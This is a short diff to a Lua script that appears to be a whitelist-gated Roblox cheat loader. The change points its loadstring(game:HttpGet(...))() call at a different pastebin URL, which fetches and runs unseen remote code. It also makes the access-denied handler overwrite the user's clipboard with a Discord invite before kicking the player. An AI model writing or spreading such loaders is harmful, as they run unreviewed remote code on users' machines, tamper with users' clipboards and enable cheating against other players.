@@ -29,12 +29,13 @@ local function executeMainScript()
     print("Loaded 100/100")
     
     -- Load the main script
-    loadstring(game:HttpGet('https://pastebin.com/raw/nu52vv0E'))()
+    loadstring(game:HttpGet('https://pastebin.com/raw/PZfidijr'))()
 end
 
 -- Function to handle access denial
 local function handleAccessDenied()
-    player:Kick("Not Whitelisted")
+    setclipboard("https://discord.gg/haxhq")
+    player:Kick("Not Whitelisted | Discord Copied To Clipboard")
     -- Optionally, display a message to the user or prevent further actions
 end
 
